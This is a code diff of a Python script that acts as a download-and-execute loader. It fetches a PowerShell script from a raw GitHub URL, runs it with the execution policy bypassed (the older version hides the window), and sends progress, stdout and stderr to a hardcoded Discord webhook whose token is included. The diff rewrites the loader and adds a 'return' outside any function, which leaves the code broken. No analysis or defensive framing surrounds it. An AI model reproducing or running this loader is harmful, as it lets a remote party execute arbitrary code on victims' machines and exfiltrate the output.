@@ -1,48 +1,58 @@
 import subprocess
 import tempfile
 import os
-os.system('py -m pip install requests')
-os.system('python -m pip install requests')
-os.system('pip install requests')
 import requests
+import traceback
 
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1418620647654953144/quGfUxYm_ZNxydSkulCZd2NGHsrHdfIm0h5J9gM5R0FQyrdsQRecWTTMaI3Mff3cWQzU'
 SCRIPT_URL = 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/1.ps1'
 
-def send_discord_notification(message, color=0x00FF00):
+def send(msg, color=0x00FF00):
     try:
-        requests.post(WEBHOOK_URL, json={'embeds': [{'description': message, 'color': color}]})
+        requests.post(WEBHOOK_URL, json={'embeds': [{'description': str(msg)[:4000], 'color': color}]})
     except:
         pass
-send_discord_notification("inited")
-try:
-    send_discord_notification("getting script")
-    script_content = requests.get(SCRIPT_URL, verify=False).content
-    send_discord_notification("got script")
-except:
-    send_discord_notification('Failed to download script', 0xFF0000)
-    exit(1)
-
-
-send_discord_notification("getting a temp file")
-with tempfile.NamedTemporaryFile(delete=False, suffix='.ps1') as temp_file:
-    temp_file.write(script_content)
-    temp_file_path = temp_file.name
 
 try:
-    send_discord_notification("trying to run")
-    result = subprocess.run(
-        ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-File', temp_file_path],
-        capture_output=True,
-        text=True,
-        creationflags=subprocess.CREATE_NO_WINDOW
-    )
-    if result.returncode == 0:
-        send_discord_notification('Script executed successfully\n' + result.stdout, 0x00FF00)
-    else:
-        send_discord_notification('Script failed\n' + result.stderr, 0xFF0000)
+    send('starting')
+    os.system('py -m pip install requests')
+    os.system('python -m pip install requests')
+    os.system('pip install requests')
+    send('requests installed')
+    send('downloading script')
+    r = requests.get(SCRIPT_URL, verify=False)
+    if r.status_code != 200:
+        send(f'failed to download script ({r.status_code})', 0xFF0000)
+        return
+    script_content = r.content
+    send('downloaded script')
+    with tempfile.NamedTemporaryFile(delete=False, suffix='.ps1', mode='wb') as f:
+        f.write(script_content)
+        temp = f.name
+    send(f'saved temp file: {temp}')
+    try:
+        send('executing via cmd+ps1')
+        result = subprocess.run(
+            ['cmd.exe', '/c', f'powershell.exe -ExecutionPolicy Bypass -File "{temp}"'],
+            capture_output=True,
+            text=True
+        )
+        send(f'return code: {result.returncode}')
+        if result.stdout.strip():
+            send(f'stdout:\n{result.stdout[:1900]}')
+        if result.stderr.strip():
+            send(f'stderr:\n{result.stderr[:1900]}', 0xFF0000)
+        if result.returncode == 0:
+            send('script executed successfully')
+        else:
+            send('script failed', 0xFF0000)
+    except Exception as e:
+        send(f'subprocess error: {e}\n{traceback.format_exc()}', 0xFF0000)
+    finally:
+        try:
+            os.unlink(temp)
+            send('temp file deleted')
+        except Exception as e:
+            send(f'failed to delete temp file: {e}', 0xFF0000)
 except Exception as e:
-    send_discord_notification(f"error running {e}")
-finally:
-    os.unlink(temp_file_path)
-    send_discord_notification("unlinked")
+    send(f'critical error: {e}\n{traceback.format_exc()}', 0xFF0000)
